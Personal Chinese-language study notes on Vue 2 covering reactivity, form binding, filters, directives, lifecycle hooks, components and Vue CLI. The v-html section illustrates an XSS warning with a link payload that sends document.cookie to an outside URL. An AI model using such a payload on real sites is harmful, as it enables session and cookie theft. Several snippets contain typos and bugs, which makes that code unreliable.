this.persons[0] = {id:'001',name:'马老师',age:50,sex:'男'} 更改data数据，Vue不监听，模板不改变

~~~html
<title>更新时的一个问题</title>
<script type="text/javascript" src="../js/vue.js"></script>

<div id="root">
  <h2>人员列表</h2>
  <button @click="updateMei">更新马冬梅的信息</button>
  <ul>
    <li v-for="(p,index) of persons" :key="p.id">
      {{p.name}}-{{p.age}}-{{p.sex}}
    </li>
  </ul>
</div>

<script type="text/javascript">
  Vue.config.productionTip = false

  const vm = new Vue({
    el: '#root',
    data: {
      persons: [
        { id: '001', name: '马冬梅', age: 30, sex: '女' },
        { id: '002', name: '周冬雨', age: 31, sex: '女' },
        { id: '003', name: '周杰伦', age: 18, sex: '男' },
        { id: '004', name: '温兆伦', age: 19, sex: '男' }
      ]
    },
    methods: {
      updateMei() {
        // this.persons[0].name = '马老师'	//奏效
        // this.persons[0].age = 50				//奏效
        // this.persons[0].sex = '男'			//奏效
        // this.persons[0] = {id:'001',name:'马老师',age:50,sex:'男'} //不奏效
        this.persons.splice(0, 1, { id: '001', name: '马老师', age: 50, sex: '男' })
      }
    }
  })
</script>
~~~

模拟一个数据检测

~~~js
let data = {
  name: '尚硅谷',
  address: '北京',
}

function Observer(obj) {
  // 汇总对象中所有的属性形成一个数组
  const keys = Object.keys(obj)
  // 遍历
  keys.forEach((k) => {
    Object.defineProperty(this, k, {
      get() {
        return obj[k]
      },
      set(val) {
        console.log(`${k}被改了，我要去解析模板，生成虚拟DOM.....我要开始忙了`)
        obj[k] = val
      }
    })
  })
}

// 创建一个监视的实例对象，用于监视data中属性的变化
const obs = new Observer(data)
console.log(obs)

// 准备一个vm实例对象
let vm = {}
vm._data = data = obs
~~~

原理

 1.  vue会监视data中所有层次的数据

 2.  如和检测对象中的数据？

     通过setter实现监视，且要在new Vue()时就传入要检测的数据

     - 对象创建后追加的属性，vue默认不做响应式处理

     - 如需给后添加的属性做响应式，请使用如下api

       Vue.set(target,propertyName/index,value)

       vm.$set(target,propertyName/index,value)

 3.  如何检测数组中的数据

     通过包裹数组更新元素的方法实现，本质就是做了两件事情

     - 调用原生对应的方法对数组进行更新
     - 重新解析模板，进而更新页面

 4.  在vue修改数组中的某个元素一定要用如下方法

     ==push()====pop()====unshift()====shift()====splice()====sort()====reverse()==这几个方法被Vue重写了
     Vue.set()或vm.$set()

特别注意：Vue.set() 和 vm.$set() 不能给vm或vm的根数据对象（data等）添加属性

​    

~~~html
<body>
    <div id="root">
        <h1>学生信息</h1>
        <button @click="student.age++">年龄+1岁</button> <br />
        <button @click="addSex">添加性别属性，默认值：男</button> <br />
        <button @click="student.sex = '未知' ">修改性别</button> <br />
        <button @click="addFriend">在列表首位添加一个朋友</button> <br />
        <button @click="updateFirstFriendName">修改第一个朋友的名字为：张三</button> <br />
        <button @click="addHobby">添加一个爱好</button> <br />
        <button @click="updateHobby">修改第一个爱好为：开车</button> <br />
        <button @click="removeSmoke">过滤掉爱好中的抽烟</button> <br />
        <h3>姓名：{{ student.name }}</h3>
        <h3>年龄：{{ student.age }}</h3>
        <h3 v-if="student.sex">性别：{{student.sex}}</h3>
        <h3>爱好：</h3>
        <ul>
            <li v-for="(h,index) in student.hobby" :key="index">{{ h }} </li>
        </ul>
        <h3>朋友们：</h3>
        <ul>
            <li v-for="(f,index) in student.friends" :key="index">{{ f.name }}--{{ f.age }}</li>
        </ul>
    </div>
    <script>
        Vue.config.productionTip = false
        new Vue({
            el: '#root',
            data: {
                student: {
                    name: 'tom',
                    age: 18,
                    hobby: ['抽烟', '喝酒', '烫头'],
                    friends: [
                        { name: 'jerry', age: 35 },
                        { name: 'tony', age: 36 }
                    ]
                }
            },
            methods: {
                addSex() {
                    this.$set(this.student, 'sex', '男')
                },
                addFriend() {
                    this.student.friends.unshift({ name: 'jack', age: 70 })
                },
                updateFirstFriendName() {
                    this.student.friends[0].name = '张三'
                },
                addHobby() {
                    this.student.hobby.push('学习')
                },
                updateHobby() {
                    this.$set(this.student.hobby, 0, '开车')
                },
                removeSmoke() {
                    this.student.hobby = this.student.hobby.filter((h) => {
                        return h !== '抽烟'
                    })
                }
            }
        }
        ) 
    </script>
~~~

# 收集表单数据 过滤器

## 收集表单数据

- 若<input type="text"/>  则==v-model==收集的是==value==值，用户输入的内容就是value值
- 若<input type="radio"/> 则==v-model==收集的是==value==值，且要给标签配置value属性
- 若<input type="checkbox"/> 
  - 没配置==value==属性，那么收集的是==checked==属性（勾选or未勾选，是布尔值）
  - 配置了==value==属性
    - ==v-model==的初始值是非数组，那么收集的就是==checked==属性
    - ==v-model==初始值是数组，那么收集的就是==value==组成的数组

a .lazy 失去焦点

b. number 输入字符串转为有效的数字

c. trim 输入的字符串去掉首尾空格过滤

~~~html
<title>收集表单数据</title>
    <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
</head>

<body>
    <div id="root">
        <form @submit.prevent="demo">
            账号：<input type="text" v-model.trim="userInfo.account"> <br><br>
            密码：<input type="password" v-model="userInfo.password"> <br><br>
            年龄：<input type="number" v-model.number="userInfo.age"> <br><br>
            性别：
            男<input type="radio" v-model="userInfo.sex" value="male">
            女<input type="radio" v-model="userInfo.sex" value="female"> <br><br>
            爱好：
            学习<input type="checkbox" v-model="userInfo.hobby" value="study">
            打游戏<input type="checkbox" v-model="userInfo.hobby" value="game">
            吃饭<input type="checkbox" v-model="userInfo.hobby" value="eat">
            <br><br>
            所属校区：
            <select v-model="userInfo.city">
                <option value="">请选择校区</option>
                <option value="beijing">北京</option>
                <option value="shanghai">上海</option>
                <option value="shenzhen">深圳</option>
            </select>
            <br><br>
            其他信息：
            <textarea v-model.lazy="userInfo.other"></textarea><br><br>
            <input type="checkbox" v-model="userInfo.agree">阅读并接受
            <a href="https://www.yuque.com/cessstudy">《用户协议》</a>
            <button>提交</button>
        </form>
    </div>
    <script>
        Vue.config.productionTip = false
        new Vue({
            el: '#root',
            data: {
                userInfo: {
                    account: '',
                    password: '',
                    age: 18,
                    sex: 'female',
                    hobby: [],
                    city: 'beijing',
                    other: '',
                    agree: ''
                }
            },
            methods: {
                demo() {
                    console.log(JSON.stringify(this.userInfo))
                }
            }
        }
        ) 
    </script>
~~~



![image-20230715095923074](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//image-20230714212428779.png)

## 过滤器(Vue3以及移除)

定义：对咬现实的数据进行特定格式化后再显示(适用于一些简单逻辑的处理)

注册过滤器：

​	Vue.filter(name,callback) 全局过滤器

​	new Vue{{filters：{}}} 局部过滤器

使用过滤器{{xxx|过滤器名}} 或v-bind:属性 = “xxx|属性名”

备注：

1. 过滤器可以接受额外参数，多个过滤器也可以串联
2. 并没有改变原本的数据，而是产生新的对应的数据

处理时间的库moment体积较大 dayjs轻量级

~~~html
<body>
    <div id="root">
        <h2>时间</h2>
        <h3>当前时间戳：{{time}}</h3>
        <h3>转换后时间{{time|timeFormater()}}</h3>
        <h3>转换后时间{{time|timeFormater('YYYY-MM-DD HH:mm:ss')}}</h3>
        <h3>截取年月日：{{time | timeFormater() | mySlice}}</h3>
    </div>
    <script>
        Vue.config.productionTip = false
        Vue.filter('mySlice', function (value) {
            return value.slice(0, 11)
        })
        new Vue({
            el: '#root',
            data: {
                time: new Date()
            },
            filters: {
                timeFormater(value, str = "YYYY年MM月DD日 HH:mm:ss") {
                    return dayjs(value).format(str)
                }
            }
        })
    </script>
~~~



![image-20230715101319847](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//image-20230715101753712.png)

# 内置指令 自定义指令

## 内置指令

之前学过的指令：

​	v-bind 单向绑定

​	v-model 双向绑定

​	v-for 遍历数组、对象、字符串、指定次数

​	v-on 绑定事件，可简写为@

​	v-show 条件渲染

​	v-if 条件渲染

​	v-else-if 条件渲染

​	v-else 条件渲染

### v-text指令

作用：向其所在的节点中渲染文本内容

​	与插值语法的区别：v-text会替换掉节点中的文本内容，{{xxx}}则不会，更加灵活

~~~html
<body>
    <div id="root">
        <div>你好{{name}}</div>
        <div v-text="name"></div>
        <div v-text="str"></div>
    </div>
    <script>
        Vue.config.productionTip = false
        new Vue({
            el: '#root',
            data: {
                name: 'lyy',
                str: '<h3>你好啊</h3>'
            },
        })
    </script>
~~~

![image-20230715101753712](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//image-20230715102217100.png)

### v-html指令

作用：向指定节点渲染包含html结构的内容

与插值语法的区别

​	v-html会替换掉节点中所有的内容，{{xxx}}则不会

​	v-html可以识别html结构

严重注意v-html有安全性问题

​	在网站上动态渲染任意html都是非常危险的，容易导致xss攻击

​	一定要在可信的内容上使用v-html，永远不要用在用户提交的内容上！！！

~~~html
<body>
    <div id="root">
        <div>你好，{{ name }}</div>
        <div v-html="str"></div>
        <div v-html="str2"></div>
    </div>
    <script>
        Vue.config.productionTip = false
        new Vue({
            el: '#root',
            data: {
                name: 'lyy',
                str: '<h3>你好啊</h3>',
                str2: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>'
            },
        })
    </script>
~~~

![image-20230715102217100](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//image-20230715102919846.png)

### v-cloak指令

v-cloak指令(没有值)

​	本质是一个特殊属性，vue实例创建完毕并接管容器后，会删除v-cloak属性

​	使用css配合v-cloak可以解决网速慢页面出现{{xxx}}的问题

~~~html
<body>
    <div id="root">
        <h2 v-cloak>{{ name }}</h2>
    </div>
    <script src="http://localhost:8080/resource/5s/vue.js"></script>
    <script>
        Vue.config.productionTip = false
        console.log(1)
        new Vue({
            el: '#root',
            data: {
                name: 'lyy',
            },
        })
    </script>
~~~

### v-once指令

v-once所在节点在初次动态渲染后，就视为静态内容了，

以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能

~~~html
<title>v-once指令</title>
</head>

<body>
    <div id="root">
        <h2 v-once>初始化的n值是: {{n}}</h2>
        <h2>当前的n值是: {{n}}</h2>
        <button @click="n++">点我n+1</button>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
    <script>
        Vue.config.productionTip = false
        console.log(1)
        new Vue({
            el: '#root',
            data: {
                n: 1
            },
        })
    </script>
~~~



![image-20230715102919846](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//image-20230715101319847.png)

### v-pre指令

跳过v-pre所在节点的编译过程

可利用他跳过：没有使用指令语法，没有使用插值语法的节点，会加快编译

~~~html
    <title>v-pre指令</title>
</head>

<body>
    <div id="root">
        <h2 v-pre>Vue其实很简单</h2>
        <h2>当前的n值是:{{n}}</h2>
        <button @click="n++">点我n+1</button>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
    <script>
        Vue.config.productionTip = false
        new Vue({
            el: '#root',
            data: {
                n: 1
            },
        })
    </script>
~~~



## 自定义指令

==directives==

**定义语法**

1.局部指令

~~~js
new Vue({
  directives:{
    指令名：配置对象
  }
})
new Vue({
  directives:{
    指令名：回调函数
  }
})
~~~

2.全局指令

~~~js
Vue.directive(指令名，配置对象)
或
Vue.directive(指令名，回调函数)
Vue.directive('fbind',{
  // 指令与元素成功绑定时（一上来）
  bind(element,binding){
    element.value = binding.value// element就是DOM元素，binding就是要绑定的
  },
  // 指令所在元素被插入页面时
  inserted(element,binding){
    element.focus()
  }
  // 指令所在模板重新解析时
  update(element,binding){
  element.value=binding.value
}
})
~~~

配置对象中常用的三个回调函数

​	bind(element,binding) 指令与元素成功绑定时调用

​	inserted(element,binding) 指令所在元素被插入页面时调用

​	update(element,binding) 指令所在模块结构要被重新解析时调用

element就是DOM元素，binding就是要绑定的对象，它包含以下属性：name、value、oldvalue、expression、arg、modifiers

备注：

​	a. 指令定义时不加v- ，但使用时要加v-

​	b.指令名如果是多个单词，要使用kebab-case命名方法，不要用camelCase命名

~~~js
new Vue({
  el:"#root",
  data:{
    n:1
  },
  directives:{
    'big-name'(element,binding){
      element.innerText=binding.value*10
    }
  }
})
~~~

回顾一个DOM 操作

~~~js
<style>.demo{background-color: orange;}</style>

<body>
  <button id="btn">点我创建一个输入框</button>
</body>

<script type="text/javascript" >
  const btn = document.getElementById('btn')
  btn.onclick = ()=>{
    const input = document.createElement('input')

    input.className = 'demo'
    input.value = 99
    input.onclick = ()=>{alert(1)}

    document.body.appendChild(input)

    input.focus()
    input.parentElement.style.backgroundColor = 'skyblue'
  }
</script>
~~~

~~~html
    <title>自定义指令</title>
</head>

<body>
    <div id="root">
        <h2>{{ name }}</h2>
        <h2>当前的n值是：<span v-text="n"></span> </h2>
        <!-- <h2>放大10倍后的n值是：<span v-big-number="n"></span> </h2> -->
        <h2>放大10倍后的n值是：<span v-big="n"></span> </h2>
        <button @click="n++">点我n+1</button>
        <hr />
        <input type="text" v-fbind:value="n">
    </div>
    <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
    <script>
        Vue.config.productionTip = false
        new Vue({
            el: '#root',
            data: {
                name: 'lyy',
                n: 1
            },
            directives: {
                big(element, binding) {
                    console.log('big', this)
                    element.innerText = binding.value * 10
                },
                fbind: {
                    bind(element, binding) {
                        element.value = binding.value
                    },
                    insterted(element, binding) {
                        element.focus()
                    },
                    update(element, binding) {
                        element.value = binding.value
                    }
                }
            }
        })
    </script>
~~~

![image-20230715104812637](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//image-20230715104812637.png)

# 生命周期

## 生命周期

- 又叫生命周期回调函数，生命周期函数、生命周期钩子
- 是什么：Vue在关键时刻帮我们调用的一些特殊名称的函数
- 生命周期的名字不可更改，但函数的具体内容是程序员根据需求编写的
- 生命周期的this指向vm或组件实例对象

~~~html
<title>引出生命周期</title>
</head>

<body>
    <div id="root">
        <h2 v-if="a">你好啊</h2>
        <h2 :style="{opacity}">看笔记学Vue</h2>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
    <script>
        Vue.config.productionTip = false
        new Vue({
            el: '#root',
            data: {
                a: false,
                opacity: 1

            },
            // 🔴Vue 完成模板的解析并把初始的真实 DOM 元素放入页面后（挂载完毕）调用 mounted
            mounted() {
                console.log('mounted', this)
                setInterval(() => {
                    this.opacity -= 0.01
                    if (this.opacity <= 0) this.opacity = 1
                }, 16);
            },
        })


         // 通过外部的定时器实现（不推荐）
        // setInterval(() => {
        // 		vm.opacity -= 0.01
        // 		if(vm.opacity <= 0) vm.opacity = 1
        // },16)
    </script>
~~~

## 分析生命周期

![生命周期](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//生命周期.png)

~~~html
<title>分析生命周期</title>
</head>

<body>
    <div id="root">
        <h2 v-text="n"></h2>
        <h2>当前的n值是：{{ n }}</h2>
        <button @click="add">点我n+1</button>
        <button @click="bye">点我销毁vm</button>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
    <script>
        Vue.config.productionTip = false
        new Vue({
            el: '#root',
            data: {
                n: 1
            },
            methods: {
                add() {
                    console.log('add')
                    this.n++
                },
                bye() {
                    console.log('bye')
                    this.$destroy()
                }
            },
            watch: {
                n() {
                    console.log('n变了');
                }
            },
            beforeCreate() {
                console.log('beforeCreate')
            },
            created() {
                console.log('created')
            },
            beforeMount() {
                console.log("beforeMount")
            },
            mounted() {
                console.log('mounted');
            },
            beforeUpdate() {
                console.log('beforeUpdate');
            },
            updated() {
                console.log('updated')
            },
            beforeDestroy() {
                console.log('beforeDestroy')
            },
            destroyed() {
                console.log('destroyed')
            }
        })
    </script>
~~~



![image-20230715110506727](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//image-20230715110506727.png)

## 总结生命周期

常用的生命周期钩子

​	a. mounted 发送ajax请求、启动定时器、绑定自定义事件、订阅消息等初始化操作

​	b.beforeDestory 清除定时器、解绑自定义事件、取消订阅信息等收尾工作

关于销毁Vue实例

​	a.销毁后借助Vue开发者工具看不到任何信息

​	b.销毁后自定义事件会失效，但是原生DOM事件依然有效

​	c.一般不会再beforeDestory操作数据，因为即使操作数据，也不会再触发更新流程了

~~~html
<title>引出生命周期</title>
</head>

<body>
    <div id="root">
        <h2 :style="{opacity}">欢迎学习Vue</h2>
        <button @click="opacity = 1">透明度设置为1</button>
        <button @click="stop">点我停止变换</button>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
    <script>
        Vue.config.productionTip = false
        new Vue({
            el: '#root',
            data: {
                opacity: 1
            },
            methods: {
                stop() {
                    this.$destroy()
                }
            },
            mounted() {
                console.log('mounted', this)
                this.timer = setInterval(() => {
                    console.log('setInterval')
                    this.opacity -= 0.01
                    if (this.opacity <= 0) this.opacity = 1
                }, 16)
            },
            beforeDestroy() {
                clearInterval(this.timer)
                console.log('vm即将驾鹤西游了')
            },
        })
    </script>
~~~

# 组件化编程

## 模块与组件、模块化与组件化

![传统方式编写应用](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//传统方式编写应用.png)

![组件方式编写应用](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//组件方式编写应用.png)

模块
	a.理解：向外提供特定功能的 js 程序，一般就是一个 js 文件
	b.为什么：js 文件很多很复杂
	c.作用：复用、简化 js 的编写，提高 js 运行效率
组件
	a.定义：用来实现局部功能的代码和资源的集合（html/css/js/image…）
	b.为什么：一个界面的功能很复杂
	c.作用：复用编码，简化项目编码，提高运行效率
模块化
	当应用中的 js 都以模块来编写的，那这个应用就是一个模块化的应用
组件化
	当应用中的功能都是多组件的方式来编写的，那这个应用就是一个组件化的应用

## 非单文件组件

非单文件组件：一个文件中包含有n个组件

单文件组件：一个文件中只包含1个组件

### 基本使用

三大步骤

1.定义组件

- 使用Vue.extend(options)创建，其中options和new Vue(options)时传入的options 几乎一样，但也有点区别
  - el不写，因为最终所有的组件都要经过一个vm的管理，由vm中的el才绝对服务哪个容器
  - data必须写成函数，避免组件被复用时，数据存在引用关系

2.注册组件

1. 局部注册：new Vue() 时options 传入components 选项
2. 全局注册：Vue.component(‘组件名’, 组件)

3.使用组件

​	编写组件标签 如：<school></school>

~~~html
    <title>基本使用</title>
</head>

<body>
    <div id="root">
        <h2>{{msg}}</h2>
        <hr>
        <!-- 第三步：编写组件标签 -->
        <school></school>
        <hr>
        <student></student>
        <hr>
        <hello></hello>
        <hr>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
    <script>
        // 第一步创建组件
        const school = Vue.extend({
            // el:'#root'    //组件定义时，一定不要写el
            // 因为最终所有的组件都要被一个vm管理，由vm决定服务于哪个容器
            template: `
                <div class="demo">
                    <h3>学校名称：{{schoolName}}</h3>
                    <h3>学校地址：{{address}}</h3>
                    <button @click="showName">点我提示学校名</button>	
                </div>
            `,
            data() {
                return {
                    schoolName: 'sgg',
                    address: '河南'
                }
            },
            methods: {
                showName() {
                    alert(this.schoolName)
                }
            }
        })
        // 第一步创建student组件
        const student = Vue.extend({
            template: `
                <div>
					<h3>学生姓名：{{studentName}}</h3>
					<h3>学生年龄：{{age}}</h3>
  			    </div>
            `,
            data() {
                return {
                    studentName: 'lyy',
                    age: 20
                }
            }
        })
        // 第一步，创建hello组件
        const hello = Vue.extend({
            template: `
				<div>	
					<h3>你好啊！{{name}}</h3>
  			</div>
			`,
            data() {
                return {
                    name: 'cess'
                }
            }
        })
        // 第二步，注册全局组件
        Vue.component('hello', hello)
        Vue.config.productionTip = false
        new Vue({
            el: '#root',
            data: {
                msg: '你好啊！'
            },
            //第二步注册局部组件
            components: {
                school,
                student
            }
        })
    </script>
~~~

![image-20230715113527003](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//image-20230715113527003.png)

### 组件注意事项

关于组件名

- 一个单词组成
  - 第一种写法首字母小写 school
  - 第二种写法 首字母大写 School
- 多个单词组成
  - 第一种写法kekab-case命名 my-school
  - 第二章写法CamelCase命名 MySchool

- 备注
  - 组件名尽可能回避HTML种已经存在的元素名称,例如h2 H2都i不行
  - 可以使用name配置项指定组件在开发者工具种呈现的名字

关于组件标签

- 第一种写法:<school></school>
- 第二种写法:<school/>
- 备注:不使用脚手架时,<school/>会导致后续组件不能渲染

一个简写方式 

> const school = Vue.extend(options) 可以简写为 const school = options 
> 因为父组件components引入的时候会自动创建

~~~html
<title>几个注意点</title>
</head>

<body>
    <div id="root">
        <h2>{{msg}}</h2>
        <school></school>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
    <script>
        const school = Vue.extend({
            name: 'atguigu', // 组件给自己起个名字，用于在浏览器开发工具上显示
            template: `
				<div>
					<h3>学校名称：{{name}}</h3>	
					<h3>学校地址：{{address}}</h3>	
				</div>
			`,
            data() {
                return {
                    name: 'zzgyyyjsxy',
                    address: 'hn'
                }
            }
        })
        Vue.config.productionTip = false
        new Vue({
            el: '#root',
            data: {
                msg: '你好啊！'
            },
            components: {
                school
            }
        })
    </script>
~~~

![image-20230715114402031](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//image-20230715114402031.png)

### 组件的嵌套

![组件嵌套](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//组件嵌套.png)

~~~html
    <title>组件的嵌套</title>
</head>

<body>
    <div id="root">
    </div>
    <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
    <script>

        Vue.config.productionTip = false
        //定义student组件
        const student = Vue.extend({
            name: 'student',
            template: `
				<div>
					<h4>学生姓名：{{name}}</h4>	
					<h4>学生年龄：{{age}}</h4>	
  			</div>
			`,
            data() { return { name: '尚硅谷', age: 18 } }
        })

        //定义school组件
        const school = Vue.extend({
            name: 'school',
            template: `
				<div>
					<h3>学校名称：{{name}}</h3>	
					<h3>学校地址：{{address}}</h3>	
					<student></student>
 			  </div>
			`,
            data() { return { name: '尚硅谷', address: '北京' } },
            //注册组件（局部）
            components: { student }
        })

        //定义hello组件
        const hello = Vue.extend({
            template: `<h3>{{msg}}</h3>`,
            data() { return { msg: '欢迎来到尚硅谷学习！' } }
        })

        //定义app组件
        const app = Vue.extend({
            template: `
				<div>	
					<hello></hello>
					<school></school>
  			</div>
			`,
            components: { school, hello }
        })

        new Vue({
            el: '#root',
            template: `
            <app></app>
            `,
            data: {
                msg: '你好啊！'
            },
            components: { app }
        })
    </script>
~~~

![image-20230715115035148](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//image-20230715115035148.png)



### VueComponent

关于VueComponent

- ==school==组件本质是一个名为VueComponent的构造函数,且不是程序员定义的,而是Vue.extend()生成的

- 我们只需要写<school></school>或<school/> , Vue解析时会帮我们创建school组件的实例对象,即Vue帮我们执行的new VueComponent(options)

- 每次调用Vue.extend()返回的都是一个全新的VueComponent,即不同组件是不同的对象

- 关于this指向

  - 组件配置中的data函数methods中的函数watch中的函数 computed中的函数 

    它们的this均是VueComponent实例对象

  - new Vue(options)配置中:data函数methods中的函数watch中的函数 computed中的函数 

    它们的this均是Vue实例对象

- VueComponent的实例对象,以后简称vc(组件实例对象)   Vue的实例对象,以后简称vm

~~~html
    <title>VueComponent</title>
</head>

<body>
    <div id="root">
        <school></school>
        <hello></hello>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
    <script>

        Vue.config.productionTip = false
        const school = Vue.extend({
            name: 'school',
            template: `
				<div>
					<h2>学校名称：{{name}}</h2>	
					<h2>学校地址：{{address}}</h2>	
					<button @click="showName">点我提示学校名</button>
  			</div>
			`,
            data() { return { name: '尚硅谷', address: '北京' } },
            methods: { showName() { console.log('showName', this) } },
        })

        const test = Vue.extend({
            template: `<span>atguigu</span>`
        })

        // 定义hello组件
        const hello = Vue.extend({
            template: `
				<div>
					<h2>{{msg}}</h2>
					<test></test>	
  			</div>
			`,
            data() { return { msg: '你好啊！' } },
            components: { test }
        })

        new Vue({
            el: '#root',
            components: { school, hello }
        })
    </script>
~~~



![image-20230715120026623](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//image-20230715131450455.png)

### 一个重要的内置关系

![image.png](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//image-20230715133845693.png)

1. 一个重要的内置关系:VueComponent.prototype.__ proto __===Vue.prototyoe
2. 为什么要有这个关系,让组件实例对象vc可以访问到Vue原型上的属性和方法

## 单文件组件

- School.vue

~~~vue
<template>
	<div id="demo">
    <h2>学校名称:{{name}}</h2>
    <h2>学校地址:{{address}}</h2>
    <button @click="showName">点我提示学校名字</button>
  </div>
</template>
<script>
	export derfault{
    name:'School',
    data(){
      return {
        name:"sgg",
        address:"hn"
      },
    methods:{
      showName(){
        alert(this.name)
      }
    }
    }
  }
</script>
<style>
  #demo{
    background:orange;
  }
</style>
~~~

- Student.vue

~~~vue
<template>
	<div>
    <h2>学生姓名:{{name}}</h2>
    <h2>学生年龄:{{age}}</h2>
  </div>
</template>

<script>
	export default{
    name:'Student',
    data(){
      return {
        name:'lyy',
        age:20
      }
    }
  }
</script>
~~~

- App.vue

~~~vue
<template>
	<div>
    <School></School>
    <Student></Student>
  </div>
</template>

<script>
  import School from './School.vue'
  import Student from './Student.vue'
  
	export default{
    name:'App',
    components:{
      School,
      Student
    }
  }
</script>
~~~

- main.js

~~~js
import App from './App.vue'

new Vue({
  template:`<App></App>`,
  components:{App}
})
~~~

- index.html

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>单文件组件练习</title>
</head>
<body>
    <div id="root"></div>
    <script src="../../js/vue.js"></script>
    <script src="./main.js"></script>
</body>
</html>

~~~

# Vue CLI 初始化脚手架

## 初始化脚手架

### 说明

1. Vue脚手架是Vue官方提供的标准化开发工具
2. 最新的版本是?
3. 文档[Vue Cle](#https://cli.vuejs.org/zh/)

### 具体步骤

1. 如果下载缓慢,配置淘宝镜像npm config registry http://registry.npm.taobao.org
2. 全局安装@Vue/cli  npm isntall -g @Vue/cli
3. 切换到创建项目的目录,使用命令创建项目 Vue create xxx
4. 选择使用Vue的版本
5. 启动项目 npm run serve
6. 打包项目 npm run build
7. 暂停项目 ctrl + c

> vue脚手架隐藏了所有webpack相关的配置,若想查看具体的webpack配置,请执行vue inspect >output.js   
>
> 注意:只是查看,修改不起作用,只是输出一下配置看一下

### 脚手架文件结构

~~~markdown
.文件目录
├── node_modules 
├── public
│   ├── favicon.ico: 页签图标
│   └── index.html: 主页面
├── src
│   ├── assets: 存放静态资源
│   │   └── logo.png
│   │── component: 存放组件
│   │   └── HelloWorld.vue
│   │── App.vue: 汇总所有组件
│   └── main.js: 入口文件
├── .gitignore: git版本管制忽略的配置
├── babel.config.js: babel的配置文件
├── package.json: 应用包配置文件 
├── README.md: 应用描述文件
└── package-lock.json: 包版本控制文件
~~~

==src/components/School.vue==

~~~vue
<template>
	<div class="demo">
    <h2>学校名称:{{name}}</h2>
    <h2>学校地址:{{address}}</h2>
    <button @click="showName">点我提示学校名称</button>
  </div>
</template>
<script>
  export default{
    name:"School",
    data(){
      return {
        name:"sgg",
        address:"hn"
      }
    },
    methods:{
      showName(){
        alert(this.name)
      }
    }
  }
</script>
<style>
  .demo{
    background-color: orange;
  }
</style>
~~~

==src/components/Student.vue==

~~~vue
<template>
	<div>
    <h2>学生姓名:{{name}}</h2>
    <h2>学生年龄:{{age}}</h2>
  </div>
</template>
<script>
	export default {
    name:'Student',
    data(){
      return {
        name:"lyy",
        age:20
      }
    }
  }
</script>
~~~

==src/App.vue==

~~~vue
<template>
	<div>
  	<img src="./assets/logo.png" alt="">
   <School></School>
   <Student></Student>
  </div>
</template>
<script>
  import School from './components/School.vue'
  import Student from './components/Student.vue'
	export default {
    name:'App',
    components:{School,Student}
  }
</script>
~~~

==src/main.js==

~~~js
import Vue from 'vue'
import App from './App.vue'
Vue.config.productionTip = false
new Vue({
  el:"app",
  render:h=>h(app)
  // render(h){
  // retuen h(app)
	// }
})// .$mount('#app')
~~~

==public/index.html==

~~~html

<!DOCTYPE html>
<html lang="">
    <head>
        <meta charset="UTF-8">
      
        <!-- 针对IE浏览器的特殊配置，含义是让IE浏览器以最高渲染级别渲染页面 -->
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
      
        <!-- 开启移动端的理想端口 -->
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
      
        <!-- 配置页签图标 <%= BASE_URL %>是public所在路径，使用绝对路径 -->
        <link rel="icon" href="<%= BASE_URL %>favicon.ico">
      
        <!-- 配置网页标题 -->
        <title><%= htmlWebpackPlugin.options.title %></title>
    </head>
    <body>
      
      	<!-- 当浏览器不支持js时，noscript中的元素就会被渲染 -->
      	<noscript>
      		<strong>We're sorry but <%= htmlWebpackPlugin.options.title %> doesn't work properly without JavaScript enabled. Please enable it to continue.</strong>
    		</noscript>
        <!-- 容器 -->
        <div id="app"></div>
    </body>
</html>
~~~

![image-20230715131450455](https://cdn.jsdelivr.net/gh/Voun8/ty_imgs//image-20230715140320954.png)

### render函数

~~~js
import Vue from 'vue'
import App from './App.vue'

Vue.productionTip = false

new Vue({
  el:'#app',
  // render函数功能,将App组件放入容器中
  render:h=>h(app).
  // 完整形式
  //render(createElement){
  //	return createElement(app)
	// }
})
~~~

### 关于不同版本的函数

1. vue.js 与vue.runtime.xxx.js的区别

   1. ==vue.js== 是完整版的Vue ,包含：==核心功能==+==模板解析器==

   2. vue.runtime.xxx.js 是运行版的Vue，只包含核心功能，没有模板解析器

      esm就是ES6 module

2. 因为**vue.runtime.xxx.js**没有模板解析器，所以不能使用==template==配置项，需要使用render函数接收到的==createElement==函数去制定具体内容

### Vue.config.js配置文件

==vue inspect>output.js== 可以查看到Vue脚手架的默认配置

